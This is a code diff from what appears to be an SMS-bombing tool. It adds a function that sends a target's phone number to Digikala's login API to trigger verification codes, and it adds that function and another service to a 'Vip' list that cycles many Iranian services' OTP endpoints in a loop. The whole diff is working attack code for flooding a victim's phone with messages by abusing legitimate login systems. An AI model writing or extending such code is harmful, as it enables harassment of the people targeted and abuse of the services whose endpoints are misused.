@@ -212,6 +212,21 @@ def snapp_market(phone):
         print(f'{r}[!] Snapp Market Exception: {e}{a}')
         return False
 
+def digikala(phone):
+    url = "https://api.digikala.com/v1/user/authenticate/"
+    payload = {"username": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Digikala) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Digikala) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Digikala Exception: {e}{a}')
+        return False
+        
+
 # Wrapper to safely run each service
 def send_service_safe(service, phone):
     result = service(phone)
@@ -225,7 +240,8 @@ def Vip(phone, Time):
     services = [
     snap, gap, divar, alibaba, mek, okorosh,
     drnext, pindo, shahrfarsh, tetherland, snapp_market,
-    trip_call, paklean_call, ragham_call
+    trip_call, paklean_call, ragham_call,
+    digikala, barghman
 ]
     total_services = len(services)
     
